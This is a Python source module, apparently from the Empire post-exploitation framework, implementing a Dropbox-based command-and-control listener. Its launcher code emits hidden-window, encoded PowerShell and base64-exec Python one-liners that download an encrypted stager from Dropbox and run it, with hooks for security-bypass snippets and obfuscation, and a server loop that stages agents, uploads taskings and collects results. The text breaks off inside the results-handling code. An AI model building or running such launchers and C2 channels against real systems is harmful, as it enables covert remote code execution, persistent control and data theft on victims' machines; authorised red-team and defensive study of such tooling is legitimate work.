from __future__ import print_function

import base64
import copy
import json
import os
import time
from builtins import object, str
from textwrap import dedent
from typing import List

import dropbox
from pydispatch import dispatcher

from empire.server.common import encryption, helpers, templating
from empire.server.database import models
from empire.server.database.base import Session
from empire.server.utils import data_util, listener_util


class Listener(object):
    def __init__(self, mainMenu, params=[]):

        self.info = {
            "Name": "Dropbox",
            "Author": ["@harmj0y"],
            "Description": ("Starts a Dropbox listener."),
            "Category": ("third_party"),
            "Comments": [],
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            "Name": {
                "Description": "Name for the listener.",
                "Required": True,
                "Value": "dropbox",
            },
            "APIToken": {
                "Description": "Authorization token for Dropbox API communication.",
                "Required": True,
                "Value": "",
            },
            "PollInterval": {
                "Description": "Polling interval (in seconds) to communicate with the Dropbox Server.",
                "Required": True,
                "Value": "5",
            },
            "BaseFolder": {
                "Description": "The base Dropbox folder to use for comms.",
                "Required": True,
                "Value": "/Empire/",
            },
            "StagingFolder": {
                "Description": "The nested Dropbox staging folder.",
                "Required": True,
                "Value": "/staging/",
            },
            "TaskingsFolder": {
                "Description": "The nested Dropbox taskings folder.",
                "Required": True,
                "Value": "/taskings/",
            },
            "ResultsFolder": {
                "Description": "The nested Dropbox results folder.",
                "Required": True,
                "Value": "/results/",
            },
            "Launcher": {
                "Description": "Launcher string.",
                "Required": True,
                "Value": "powershell -noP -sta -w 1 -enc ",
            },
            "StagingKey": {
                "Description": "Staging key for initial agent negotiation.",
                "Required": True,
                "Value": "2c103f2c4ed1e59c0b4e2e01821770fa",
            },
            "DefaultDelay": {
                "Description": "Agent delay/reach back interval (in seconds).",
                "Required": True,
                "Value": 60,
            },
            "DefaultJitter": {
                "Description": "Jitter in agent reachback interval (0.0-1.0).",
                "Required": True,
                "Value": 0.0,
            },
            "DefaultLostLimit": {
                "Description": "Number of missed checkins before exiting",
                "Required": True,
                "Value": 10,
            },
            "DefaultProfile": {
                "Description": "Default communication profile for the agent.",
                "Required": True,
                "Value": "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
            },
            "KillDate": {
                "Description": "Date for the listener to exit (MM/dd/yyyy).",
                "Required": False,
                "Value": "",
            },
            "WorkingHours": {
                "Description": "Hours for the agent to operate (09:00-17:00).",
                "Required": False,
                "Value": "",
            },
            "SlackURL": {
                "Description": "Your Slack Incoming Webhook URL to communicate with your Slack instance.",
                "Required": False,
                "Value": "",
            },
        }

        # required:
        self.mainMenu = mainMenu
        self.threads = {}

        # optional/specific for this module

        # set the default staging key to the controller db default
        self.options["StagingKey"]["Value"] = str(
            data_util.get_config("staging_key")[0]
        )

    def default_response(self):
        """
        Returns a default HTTP server page.
        """
        return ""

    def validate_options(self):
        """
        Validate all options for this listener.
        """

        self.uris = [
            a.strip("/")
            for a in self.options["DefaultProfile"]["Value"].split("|")[0].split(",")
        ]

        for key in self.options:
            if self.options[key]["Required"] and (
                str(self.options[key]["Value"]).strip() == ""
            ):
                print(helpers.color('[!] Option "%s" is required.' % (key)))
                return False

        return True

    def generate_launcher(
        self,
        encode=True,
        obfuscate=False,
        obfuscationCommand="",
        userAgent="default",
        proxy="default",
        proxyCreds="default",
        stagerRetries="0",
        language=None,
        safeChecks="",
        listenerName=None,
        bypasses: List[str] = None,
    ):
        """
        Generate a basic launcher for the specified listener.
        """
        bypasses = [] if bypasses is None else bypasses

        if not language:
            print(
                helpers.color(
                    "[!] listeners/dbx generate_launcher(): no language specified!"
                )
            )

        if (
            listenerName
            and (listenerName in self.threads)
            and (listenerName in self.mainMenu.listeners.activeListeners)
        ):

            # extract the set options for this instantiated listener
            listenerOptions = self.mainMenu.listeners.activeListeners[listenerName][
                "options"
            ]
            # host = listenerOptions['Host']['Value']
            staging_key = listenerOptions["StagingKey"]["Value"]
            profile = listenerOptions["DefaultProfile"]["Value"]
            launcher = listenerOptions["Launcher"]["Value"]
            staging_key = listenerOptions["StagingKey"]["Value"]
            pollInterval = listenerOptions["PollInterval"]["Value"]
            api_token = listenerOptions["APIToken"]["Value"]
            baseFolder = listenerOptions["BaseFolder"]["Value"].strip("/")
            staging_folder = "/%s/%s" % (
                baseFolder,
                listenerOptions["StagingFolder"]["Value"].strip("/"),
            )
            taskingsFolder = "/%s/%s" % (
                baseFolder,
                listenerOptions["TaskingsFolder"]["Value"].strip("/"),
            )
            resultsFolder = "/%s/%s" % (
                baseFolder,
                listenerOptions["ResultsFolder"]["Value"].strip("/"),
            )

            if language.startswith("po"):
                # PowerShell

                # replace with stager = '' for troubleshooting
                stager = '$ErrorActionPreference = "SilentlyContinue";'
                if safeChecks.lower() == "true":
                    stager = "If($PSVersionTable.PSVersion.Major -ge 3){"

                    for bypass in bypasses:
                        stager += bypass
                    stager += "};[System.Net.ServicePointManager]::Expect100Continue=0;"

                stager += "$wc=New-Object System.Net.WebClient;"

                if userAgent.lower() == "default":
                    profile = listenerOptions["DefaultProfile"]["Value"]
                    userAgent = profile.split("|")[1]
                stager += f"$u='{ userAgent }';"

                if userAgent.lower() != "none" or proxy.lower() != "none":

                    if userAgent.lower() != "none":
                        stager += "$wc.Headers.Add('User-Agent',$u);"

                    if proxy.lower() != "none":
                        if proxy.lower() == "default":
                            stager += (
                                "$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;"
                            )

                        else:
                            # TODO: implement form for other proxy
                            stager += f"""
                                $proxy=New-Object Net.WebProxy;
                                $proxy.Address = '{ proxy.lower() }';
                                $wc.Proxy = $proxy;
                            """

                        if proxyCreds.lower() == "default":
                            stager += "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"

                        else:
                            # TODO: implement form for other proxy credentials
                            username = proxyCreds.split(":")[0]
                            password = proxyCreds.split(":")[1]
                            domain = username.split("\\")[0]
                            usr = username.split("\\")[1]
                            stager += f"""
                                $netcred = New-Object System.Net.NetworkCredential('{ usr }', '{ password }', '{ domain }');
                                $wc.Proxy.Credentials = $netcred;
                            """

                        # save the proxy settings to use during the entire staging process and the agent
                        stager += "$Script:Proxy = $wc.Proxy;"

                # TODO: reimplement stager retries?

                # code to turn the key string into a byte array
                stager += f"$K=[System.Text.Encoding]::ASCII.GetBytes('{staging_key}');"

                # this is the minimized RC4 stager code from rc4.ps1
                stager += listener_util.powershell_rc4()

                stager += dedent(
                    f""" 
                    # add in the Dropbox auth token and API params
                    $t='{ api_token }';
                    $wc.Headers.Add("Authorization","Bearer $t");
                    $wc.Headers.Add("Dropbox-API-Arg",\'{{"path":"{ staging_folder }/debugps"}}\');
                    $data=$wc.DownloadData('https://content.dropboxapi.com/2/files/download');
                    $iv=$data[0..3];$data=$data[4..$data.length];
                    
                    # decode everything and kick it over to IEX to kick off execution
                    -join[Char[]](& $R $data ($IV+$K))|IEX
                    """
                )

                # Remove comments and make one line
                stager = helpers.strip_powershell_comments(stager)
                stager = data_util.ps_convert_to_oneliner(stager)

                if obfuscate:
                    stager = data_util.obfuscate(
                        self.mainMenu.installPath,
                        stager,
                        obfuscationCommand=obfuscationCommand,
                    )
                # base64 encode the stager and return it
                if encode and (
                    (not obfuscate) or ("launcher" not in obfuscationCommand.lower())
                ):
                    return helpers.powershell_launcher(stager, launcher)
                else:
                    # otherwise return the case-randomized stager
                    return stager

            elif language.startswith("py"):
                launcherBase = "import sys;"
                # monkey patch ssl woohooo
                launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;"

                try:
                    if safeChecks.lower() == "true":
                        launcherBase += listener_util.python_safe_checks()
                except Exception as e:
                    p = "[!] Error setting LittleSnitch in stager: " + str(e)
                    print(helpers.color(p, color="red"))

                if userAgent.lower() == "default":
                    profile = listenerOptions["DefaultProfile"]["Value"]
                    userAgent = profile.split("|")[1]

                launcherBase += dedent(
                    f"""
                    import urllib.request;
                    UA='{ userAgent }';
                    t='{ api_token }';
                    server='https://content.dropboxapi.com/2/files/download';
                    req=urllib.request.Request(server);
                    req.add_header('User-Agent',UA);
                    req.add_header("Authorization","Bearer "+t);
                    req.add_header("Dropbox-API-Arg",'{{"path":"{ staging_folder }/debugpy"}}');
                    """
                )

                if proxy.lower() != "none":
                    if proxy.lower() == "default":
                        launcherBase += "proxy = urllib.request.ProxyHandler();\n"
                    else:
                        proto = proxy.Split(":")[0]
                        launcherBase += f"proxy = urllib.request.ProxyHandler({{'{proto}':'{proxy}'}});\n"

                    if proxyCreds != "none":
                        if proxyCreds == "default":
                            launcherBase += "o = urllib.request.build_opener(proxy);\n"
                        else:
                            launcherBase += "proxy_auth_handler = urllib.request.ProxyBasicAuthHandler();\n"
                            username = proxyCreds.split(":")[0]
                            password = proxyCreds.split(":")[1]
                            launcherBase += dedent(
                                f"""
                                proxy_auth_handler.add_password(None,'{ proxy }', '{ username }', '{ password }');
                                o = urllib.request.build_opener(proxy, proxy_auth_handler);
                            """
                            )
                    else:
                        launcherBase += "o = urllib.request.build_opener(proxy);\n"
                else:
                    launcherBase += "o = urllib.request.build_opener();\n"

                # install proxy and creds globally, so they can be used with urlopen.
                launcherBase += "urllib.request.install_opener(o);\n"
                launcherBase += "a=urllib.request.urlopen(req).read();\n"

                # RC4 decryption
                launcherBase += listener_util.python_extract_stager(staging_key)

                if encode:
                    launchEncoded = base64.b64encode(
                        launcherBase.encode("UTF-8")
                    ).decode("UTF-8")
                    launcher = (
                        "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python3 &"
                        % (launchEncoded)
                    )
                    return launcher
                else:
                    return launcherBase

        else:
            print(
                helpers.color(
                    "[!] listeners/dbx generate_launcher(): invalid listener name specification!"
                )
            )

    def generate_stager(
        self, listenerOptions, encode=False, encrypt=True, language=None
    ):
        """
        Generate the stager code needed for communications with this listener.
        """

        if not language:
            print(
                helpers.color(
                    "[!] listeners/dbx generate_stager(): no language specified!"
                )
            )
            return None

        pollInterval = listenerOptions["PollInterval"]["Value"]
        stagingKey = listenerOptions["StagingKey"]["Value"]
        baseFolder = listenerOptions["BaseFolder"]["Value"].strip("/")
        api_token = listenerOptions["APIToken"]["Value"]
        profile = listenerOptions["DefaultProfile"]["Value"]
        workingHours = listenerOptions["WorkingHours"]["Value"]
        stagingFolder = "/%s/%s" % (
            baseFolder,
            listenerOptions["StagingFolder"]["Value"].strip("/"),
        )
        taskingsFolder = "/%s/%s" % (
            baseFolder,
            listenerOptions["TaskingsFolder"]["Value"].strip("/"),
        )
        resultsFolder = "/%s/%s" % (
            baseFolder,
            listenerOptions["ResultsFolder"]["Value"].strip("/"),
        )

        if language.lower() == "powershell":
            template_path = [
                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
            ]

            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("dropbox/dropbox.ps1")

            template_options = {
                "api_token": api_token,
                "tasking_folder": taskingsFolder,
                "results_folder": resultsFolder,
                "staging_folder": stagingFolder,
                "poll_interval": pollInterval,
                "working_hours": workingHours,
                "staging_key": stagingKey,
            }

            stager = template.render(template_options)

            # Get the random function name generated at install and patch the stager with the proper function name
            stager = data_util.keyword_obfuscation(stager)
            unobfuscated_stager = listener_util.remove_lines_comments(stager)

            # base64 encode the stager and return it
            if encode:
                return helpers.enc_powershell(unobfuscated_stager)
            elif encrypt:
                RC4IV = os.urandom(4)
                return RC4IV + encryption.rc4(
                    RC4IV + stagingKey.encode("UTF-8"),
                    unobfuscated_stager.encode("UTF-8"),
                )
            else:
                # otherwise just return the case-randomized stager
                return unobfuscated_stager

        elif language.lower() == "python":
            template_path = [
                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
            ]
            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("dropbox/dropbox.py")

            template_options = {
                "api_token": api_token,
                "tasking_folder": taskingsFolder,
                "results_folder": resultsFolder,
                "staging_folder": stagingFolder,
                "poll_interval": pollInterval,
                "working_hours": workingHours,
                "staging_key": stagingKey,
                "profile": profile,
            }

            stager = template.render(template_options)

            if encode:
                return base64.b64encode(stager)
            if encrypt:
                # return an encrypted version of the stager ("normal" staging)
                RC4IV = os.urandom(4)
                return RC4IV + encryption.rc4(
                    RC4IV + stagingKey.encode("UTF-8"), stager.encode("UTF-8")
                )
            else:
                # otherwise return the standard stager
                return stager

        else:
            print(
                helpers.color(
                    "[!] listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
                )
            )

    def generate_agent(
        self,
        listenerOptions,
        language=None,
        obfuscate=False,
        obfuscationCommand="",
        version="",
    ):
        """
        Generate the full agent code needed for communications with this listener.
        """

        if not language:
            print(
                helpers.color(
                    "[!] listeners/dbx generate_agent(): no language specified!"
                )
            )
            return None

        language = language.lower()
        delay = listenerOptions["DefaultDelay"]["Value"]
        jitter = listenerOptions["DefaultJitter"]["Value"]
        profile = listenerOptions["DefaultProfile"]["Value"]
        lostLimit = listenerOptions["DefaultLostLimit"]["Value"]
        workingHours = listenerOptions["WorkingHours"]["Value"]
        killDate = listenerOptions["KillDate"]["Value"]
        b64DefaultResponse = base64.b64encode(self.default_response().encode("UTF-8"))

        if language == "powershell":
            with open(self.mainMenu.installPath + "/data/agent/agent.ps1") as f:
                code = f.read()

            # strip out comments and blank lines
            code = helpers.strip_powershell_comments(code)

            # patch in the delay, jitter, lost limit, and comms profile
            code = code.replace("$AgentDelay = 60", "$AgentDelay = " + str(delay))
            code = code.replace("$AgentJitter = 0", "$AgentJitter = " + str(jitter))
            code = code.replace(
                '$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"',
                '$Profile = "' + str(profile) + '"',
            )
            code = code.replace("$LostLimit = 60", "$LostLimit = " + str(lostLimit))
            code = code.replace(
                '$DefaultResponse = ""',
                '$DefaultResponse = "' + b64DefaultResponse.decode("UTF-8") + '"',
            )

            # patch in the killDate and workingHours if they're specified
            if killDate != "":
                code = code.replace(
                    "$KillDate,", "$KillDate = '" + str(killDate) + "',"
                )

            return code
        elif language == "python":
            if version == "ironpython":
                f = open(self.mainMenu.installPath + "/data/agent/ironpython_agent.py")
            else:
                f = open(self.mainMenu.installPath + "/data/agent/agent.py")
            code = f.read()
            f.close()

            # strip out comments and blank lines
            code = helpers.strip_python_comments(code)

            # patch some more
            code = code.replace("delay = 60", "delay = %s" % (delay))
            code = code.replace("jitter = 0.0", "jitter = %s" % (jitter))
            code = code.replace(
                'profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"',
                'profile = "%s"' % (profile),
            )
            code = code.replace("lostLimit = 60", "lostLimit = %s" % (lostLimit))
            code = code.replace(
                'defaultResponse = base64.b64decode("")',
                'defaultResponse = base64.b64decode("%s")'
                % (b64DefaultResponse.decode("UTF-8")),
            )

            # patch in the killDate and workingHours if they're specified
            if killDate != "":
                code = code.replace('killDate = ""', 'killDate = "%s"' % (killDate))
            if workingHours != "":
                code = code.replace(
                    'workingHours = ""', 'workingHours = "%s"' % (killDate)
                )

            return code
        else:
            print(
                helpers.color(
                    "[!] listeners/dbx generate_agent(): invalid language specification,  only 'powershell' and 'python' are currently supported for this module."
                )
            )

    def generate_comms(self, listenerOptions, language=None):
        """
        Generate just the agent communication code block needed for communications with this listener.

        This is so agents can easily be dynamically updated for the new listener.
        """
        baseFolder = listenerOptions["BaseFolder"]["Value"].strip("/")
        stagingKey = listenerOptions["StagingKey"]["Value"]
        pollInterval = listenerOptions["PollInterval"]["Value"]
        api_token = listenerOptions["API_TOKEN"]["Value"]
        profile = listenerOptions["DefaultProfile"]["Value"]

        stagingFolder = "/%s/%s" % (
            baseFolder,
            listenerOptions["StagingFolder"]["Value"].strip("/"),
        )
        taskingsFolder = "/%s/%s" % (
            baseFolder,
            listenerOptions["TaskingsFolder"]["Value"].strip("/"),
        )
        resultsFolder = "/%s/%s" % (
            baseFolder,
            listenerOptions["ResultsFolder"]["Value"].strip("/"),
        )

        if language:
            if language.lower() == "powershell":
                template_path = [
                    os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                    os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
                ]

                eng = templating.TemplateEngine(template_path)
                template = eng.get_template("dropbox/comms.ps1")

                template_options = {
                    "api_token": api_token,
                    "tasking_folder": taskingsFolder,
                    "results_folder": resultsFolder,
                }

                comms = template.render(template_options)
                return comms

            elif language.lower() == "python":
                template_path = [
                    os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                    os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
                ]
                eng = templating.TemplateEngine(template_path)
                template = eng.get_template("dropbox/comms.py")

                template_options = {
                    "api_token": api_token,
                    "taskings_folder": taskingsFolder,
                    "results_folder": resultsFolder,
                }

                comms = template.render(template_options)
                return comms

            else:
                print(
                    helpers.color(
                        "[!] listeners/dbx generate_comms(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
                    )
                )
        else:
            print(
                helpers.color(
                    "[!] listeners/dbx generate_comms(): no language specified!"
                )
            )

    def start_server(self, listenerOptions):
        """
        Threaded function that actually starts up polling server for Dropbox
        polling communication.

        ./Empire/
            ./staging/
                stager.ps1
                SESSION_[1-4].txt
            ./taskings/
                SESSIONID.txt
            ./results/
                SESSIONID.txt

        /Empire/staging/stager.ps1       -> RC4staging(stager.ps1) uploaded by server
        /Empire/staging/sessionID_1.txt  -> AESstaging(PublicKey) uploaded by client
        /Empire/staging/sessionID_2.txt  -> RSA(nonce+AESsession) uploaded by server
        /Empire/staging/sessionID_3.txt  -> AESsession(nonce+sysinfo) uploaded by client
        /Empire/staging/sessionID_4.txt  -> AESsession(agent.ps1) uploaded by server


        client                                              dropbox                             server
                                                                                        <- upload /Empire/staging/stager.ps1
        read /Empire/staging/stager                     ->
                                                        <-  return stager
        generate sessionID
        upload /Empire/staging/sessionID_1.txt          ->
                                                                                        <- read /Empire/staging/sessionID_1.txt
                                                                                        <- upload /Empire/staging/sessionID_2.txt
        read /Empire/staging/sessionID_2.txt            ->
                                                        <- /Empire/staging/sessionID_2.txt
        upload /Empire/staging/sessionID_3.txt          ->
                                                                                        <- read /Empire/staging/sessionID_3.txt
                                                                                        <- upload /Empire/staging/sessionID_4.txt
        read /Empire/staging/sessionID_4.txt            ->
                                                        <- /Empire/staging/sessionID_4.txt

        <start beaconing>
                                                                                        <- upload /Empire/taskings/sessionID.txt
        read /Empire/taskings/sessionID.txt             ->
                                                        <- /Empire/taskings/sessionID.txt
        delete /Empire/taskings/sessionID.txt           ->

        execute code
        upload /Empire/results/sessionID.txt            ->
                                                                                        <- read /Empire/results/sessionID.txt
                                                                                        <- delete /Empire/results/sessionID.txt

        """

        def download_file(dbx, path):
            # helper to download a file at the given path
            try:
                md, res = dbx.files_download(path)
            except dropbox.exceptions.HttpError as err:
                listenerName = self.options["Name"]["Value"]
                message = "[!] Error downloading data from '{}' : {}".format(path, err)
                signal = json.dumps({"print": True, "message": message})
                dispatcher.send(
                    signal, sender="listeners/dropbox/{}".format(listenerName)
                )

                return None
            return res.content

        def upload_file(dbx, path, data):
            # helper to upload a file to the given path
            try:
                dbx.files_upload(data, path)
            except dropbox.exceptions.ApiError:
                listenerName = self.options["Name"]["Value"]
                message = "[!] Error uploading data to '{}'".format(path)
                signal = json.dumps({"print": True, "message": message})
                dispatcher.send(
                    signal, sender="listeners/dropbox/{}".format(listenerName)
                )

        def delete_file(dbx, path):
            # helper to delete a file at the given path
            try:
                dbx.files_delete(path)
            except dropbox.exceptions.ApiError:
                listenerName = self.options["Name"]["Value"]
                message = "[!] Error deleting data at '{}'".format(path)
                signal = json.dumps({"print": True, "message": message})
                dispatcher.send(
                    signal, sender="listeners/dropbox/{}".format(listenerName)
                )

        # make a copy of the currently set listener options for later stager/agent generation
        listenerOptions = copy.deepcopy(listenerOptions)

        stagingKey = listenerOptions["StagingKey"]["Value"]
        pollInterval = listenerOptions["PollInterval"]["Value"]
        apiToken = listenerOptions["APIToken"]["Value"]
        listenerName = listenerOptions["Name"]["Value"]
        baseFolder = listenerOptions["BaseFolder"]["Value"].strip("/")
        stagingFolder = "/%s/%s" % (
            baseFolder,
            listenerOptions["StagingFolder"]["Value"].strip("/"),
        )
        taskingsFolder = "/%s/%s" % (
            baseFolder,
            listenerOptions["TaskingsFolder"]["Value"].strip("/"),
        )
        resultsFolder = "/%s/%s" % (
            baseFolder,
            listenerOptions["ResultsFolder"]["Value"].strip("/"),
        )

        dbx = dropbox.Dropbox(apiToken)

        # ensure that the access token supplied is valid
        try:
            dbx.users_get_current_account()
        except dropbox.exceptions.AuthError as err:
            print(
                helpers.color(
                    "[!] ERROR: Invalid access token; try re-generating an access token from the app console on the web."
                )
            )
            return False

        # setup the base folder structure we need
        try:
            dbx.files_create_folder(stagingFolder)
        except dropbox.exceptions.ApiError:
            listenerName = self.options["Name"]["Value"]
            message = "[*] Dropbox folder '{}' already exists".format(stagingFolder)
            signal = json.dumps({"print": False, "message": message})
            dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
        try:
            dbx.files_create_folder(taskingsFolder)
        except dropbox.exceptions.ApiError:
            listenerName = self.options["Name"]["Value"]
            message = "[*] Dropbox folder '{}' already exists".format(taskingsFolder)
            signal = json.dumps({"print": False, "message": message})
            dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
        try:
            dbx.files_create_folder(resultsFolder)
        except dropbox.exceptions.ApiError:
            listenerName = self.options["Name"]["Value"]
            message = "[*] Dropbox folder '{}' already exists".format(resultsFolder)
            signal = json.dumps({"print": False, "message": message})
            dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))

        # upload the stager.ps1 code
        stagerCodeps = self.generate_stager(
            listenerOptions=listenerOptions, language="powershell"
        )
        stagerCodepy = self.generate_stager(
            listenerOptions=listenerOptions, language="python"
        )
        try:
            # delete stager if it exists
            delete_file(dbx, "%s/debugps" % (stagingFolder))
            delete_file(dbx, "%s/debugpy" % (stagingFolder))
            dbx.files_upload(stagerCodeps, "%s/debugps" % (stagingFolder))
            dbx.files_upload(stagerCodepy, "%s/debugpy" % (stagingFolder))
        except dropbox.exceptions.ApiError:
            print(
                helpers.color(
                    "[!] Error uploading stager to '%s/stager'" % (stagingFolder)
                )
            )
            return

        while True:

            time.sleep(int(pollInterval))

            # search for anything in /Empire/staging/*
            for match in dbx.files_search(stagingFolder, "*.txt").matches:
                fileName = str(match.metadata.path_display)
                relName = fileName.split("/")[-1][:-4]
                sessionID, stage = relName.split("_")
                sessionID = sessionID.upper()

                if "_" in relName:
                    if stage == "1":
                        try:
                            md, res = dbx.files_download(fileName)
                        except dropbox.exceptions.HttpError as err:
                            listenerName = self.options["Name"]["Value"]
                            message = (
                                "[!] Error downloading data from '{}' : {}".format(
                                    fileName, err
                                )
                            )
                            signal = json.dumps({"print": True, "message": message})
                            dispatcher.send(
                                signal,
                                sender="listeners/dropbox/{}".format(listenerName),
                            )
                            continue
                        stageData = res.content

                        dataResults = self.mainMenu.agents.handle_agent_data(
                            stagingKey, stageData, listenerOptions
                        )
                        if dataResults and len(dataResults) > 0:
                            for (language, results) in dataResults:
                                # TODO: more error checking
                                try:
                                    dbx.files_delete(fileName)
                                except dropbox.exceptions.ApiError:
                                    listenerName = self.options["Name"]["Value"]
                                    message = "[!] Error deleting data at '{}'".format(
                                        fileName
                                    )
                                    signal = json.dumps(
                                        {"print": True, "message": message}
                                    )
                                    dispatcher.send(
                                        signal,
                                        sender="listeners/dropbox/{}".format(
                                            listenerName
                                        ),
                                    )
                                try:
                                    stageName = "%s/%s_2.txt" % (
                                        stagingFolder,
                                        sessionID,
                                    )
                                    listenerName = self.options["Name"]["Value"]
                                    message = "[*] Uploading key negotiation part 2 to {} for {}".format(
                                        stageName, sessionID
                                    )
                                    signal = json.dumps(
                                        {"print": True, "message": message}
                                    )
                                    dispatcher.send(
                                        signal,
                                        sender="listeners/dropbox/{}".format(
                                            listenerName
                                        ),
                                    )
                                    dbx.files_upload(results, stageName)
                                except dropbox.exceptions.ApiError:
                                    listenerName = self.options["Name"]["Value"]
                                    message = "[!] Error uploading data to '{}'".format(
                                        stageName
                                    )
                                    signal = json.dumps(
                                        {"print": True, "message": message}
                                    )
                                    dispatcher.send(
                                        signal,
                                        sender="listeners/dropbox/{}".format(
                                            listenerName
                                        ),
                                    )

                    if stage == "3":
                        try:
                            md, res = dbx.files_download(fileName)
                        except dropbox.exceptions.HttpError as err:
                            listenerName = self.options["Name"]["Value"]
                            message = (
                                "[!] Error downloading data from '{}' : {}".format(
                                    fileName, err
                                )
                            )
                            signal = json.dumps({"print": True, "message": message})
                            dispatcher.send(
                                signal,
                                sender="listeners/dropbox/{}".format(listenerName),
                            )
                            continue
                        stageData = res.content

                        dataResults = self.mainMenu.agents.handle_agent_data(
                            stagingKey, stageData, listenerOptions
                        )
                        if dataResults and len(dataResults) > 0:
                            # print "dataResults:",dataResults
                            for (language, results) in dataResults:
                                if results.startswith("STAGE2"):
                                    sessionKey = self.mainMenu.agents.agents[sessionID][
                                        "sessionKey"
                                    ]
                                    listenerName = self.options["Name"]["Value"]
                                    message = "[*] Sending agent (stage 2) to {} through Dropbox".format(
                                        sessionID
                                    )
                                    signal = json.dumps(
                                        {"print": True, "message": message}
                                    )
                                    dispatcher.send(
                                        signal,
                                        sender="listeners/dropbox/{}".format(
                                            listenerName
                                        ),
                                    )

                                    try:
                                        dbx.files_delete(fileName)
                                    except dropbox.exceptions.ApiError:
                                        listenerName = self.options["Name"]["Value"]
                                        message = (
                                            "[!] Error deleting data at '{}'".format(
                                                fileName
                                            )
                                        )
                                        signal = json.dumps(
                                            {"print": True, "message": message}
                                        )
                                        dispatcher.send(
                                            signal,
                                            sender="listeners/dropbox/{}".format(
                                                listenerName
                                            ),
                                        )

                                    try:
                                        fileName2 = fileName.replace(
                                            "%s_3.txt" % (sessionID),
                                            "%s_2.txt" % (sessionID),
                                        )
                                        dbx.files_delete(fileName2)
                                    except dropbox.exceptions.ApiError:
                                        listenerName = self.options["Name"]["Value"]
                                        message = (
                                            "[!] Error deleting data at '{}'".format(
                                                fileName2
                                            )
                                        )
                                        signal = json.dumps(
                                            {"print": True, "message": message}
                                        )
                                        dispatcher.send(
                                            signal,
                                            sender="listeners/dropbox/{}".format(
                                                listenerName
                                            ),
                                        )

                                    session_info = (
                                        Session()
                                        .query(models.Agent)
                                        .filter(models.Agent.session_id == sessionID)
                                        .first()
                                    )
                                    if session_info.language == "ironpython":
                                        version = "ironpython"
                                    else:
                                        version = ""

                                    # step 6 of negotiation -> server sends patched agent.ps1/agent.py
                                    agentCode = self.generate_agent(
                                        language=language,
                                        listenerOptions=listenerOptions,
                                        version=version,
                                    )
                                    returnResults = encryption.aes_encrypt_then_hmac(
                                        sessionKey, agentCode
                                    )

                                    try:
                                        stageName = "%s/%s_4.txt" % (
                                            stagingFolder,
                                            sessionID,
                                        )
                                        listenerName = self.options["Name"]["Value"]
                                        message = "[*] Uploading key negotiation part 4 (agent) to {} for {}".format(
                                            stageName, sessionID
                                        )
                                        signal = json.dumps(
                                            {"print": True, "message": message}
                                        )
                                        dispatcher.send(
                                            signal,
                                            sender="listeners/dropbox/{}".format(
                                                listenerName
                                            ),
                                        )
                                        dbx.files_upload(returnResults, stageName)
                                    except dropbox.exceptions.ApiError:
                                        listenerName = self.options["Name"]["Value"]
                                        message = (
                                            "[!] Error uploading data to '{}'".format(
                                                stageName
                                            )
                                        )
                                        signal = json.dumps(
                                            {"print": True, "message": message}
                                        )
                                        dispatcher.send(
                                            signal,
                                            sender="listeners/dropbox/{}".format(
                                                listenerName
                                            ),
                                        )

            # get any taskings applicable for agents linked to this listener
            sessionIDs = self.mainMenu.agents.get_agents_for_listener(listenerName)
            for x in range(len(sessionIDs)):
                if isinstance(sessionIDs[x], bytes):
                    sessionIDs[x] = sessionIDs[x].decode("UTF-8")

            for sessionID in sessionIDs:
                taskingData = self.mainMenu.agents.handle_agent_request(
                    sessionID, "powershell", stagingKey
                )
                if taskingData:
                    try:
                        taskingFile = "%s/%s.txt" % (taskingsFolder, sessionID)

                        # if the tasking file still exists, download/append + upload again
                        existingData = None
                        try:
                            md, res = dbx.files_download(taskingFile)
                            existingData = res.content
                        except:
                            existingData = None

                        if existingData:
                            taskingData = taskingData + existingData

                        listenerName = self.options["Name"]["Value"]
                        message = "[*] Uploading agent tasks for {} to {}".format(
                            sessionID, taskingFile
                        )
                        signal = json.dumps({"print": False, "message": message})
                        dispatcher.send(
                            signal, sender="listeners/dropbox/{}".format(listenerName)
                        )

                        dbx.files_upload(
                            taskingData,
                            taskingFile,
                            mode=dropbox.files.WriteMode.overwrite,
                        )
                    except dropbox.exceptions.ApiError as e:
                        listenerName = self.options["Name"]["Value"]
                        message = (
                            "[!] Error uploading agent tasks for {} to {} : {}".format(
                                sessionID, taskingFile, e
                            )
                        )
                        signal = json.dumps({"print": True, "message": message})
                        dispatcher.send(
                            signal, sender="listeners/dropbox/{}".format(listenerName)
                        )

            # check for any results returned
            for match in dbx.files_search(resultsFolder, "*.txt").matches:
                fileName = str(match.metadata.path_display)
                sessionID = fileName.split("/")[-1][:-4]

                listenerName = self.options["Name"]["Value"]
                message = "[*] Downloading data for '{}' from {}".format(
                    sessionID, fileName
                )
                signal = json.dumps({"print": False, "message": message})
                dispatcher.send(
                    signal, sender="listeners/dropbox/{}".format(listenerName)
                )

                try:
                    md, res = dbx.files_download(fileName)
                except dropbox.exceptions.HttpError as err:
                    listenerName = self.options["Name"]["Value"]
